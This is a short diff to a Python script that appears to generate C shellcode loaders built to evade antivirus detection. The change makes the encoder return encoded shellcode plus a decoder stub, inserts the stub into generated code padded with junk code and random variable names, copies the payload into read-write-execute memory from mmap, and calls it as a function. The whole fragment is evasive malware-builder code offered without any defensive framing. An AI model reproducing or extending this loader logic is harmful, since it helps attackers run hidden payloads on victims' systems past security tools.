@@ -32,7 +32,11 @@ Encryption = sys.argv[3]
 
 Randbufname = varname_creator()
 
-Payload = encoding_manager(Encryption,Payload,Randbufname)
+DecodeKit = encoding_manager(Encryption,Payload,Randbufname)
+
+Payload = DecodeKit[0]     # encoded shellcode 
+
+DecoderStub = DecodeKit[1] # decoder stub or string = False if decoder is not necessary
 
 Randmem = varname_creator()
 
@@ -85,9 +89,11 @@ Hollow_code += Junkcode_06
 Hollow_code += Randptr + " = mmap(0,sizeof(" + Randbufname + "),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);\n"
 Hollow_code += Junkcode_07
 Hollow_code += Junkcode_08
-Hollow_code += "memcpy(" + Randptr + ","+ Randbufname + ", sizeof(" + Randbufname + "));\n"
 Hollow_code += Junkcode_09
 Hollow_code += Junkcode_10
+if DecoderStub != "False":
+    Hollow_code += DecoderStub
+Hollow_code += "memcpy(" + Randptr + ","+ Randbufname + ", sizeof(" + Randbufname + "));\n"
 Hollow_code += Junkcode_11
 Hollow_code += "int " + Randinj + " = ((int(*)(void))" + Randptr + ")();}\n"
 Hollow_code += "else{" + Junkcode_12 + "}\n"
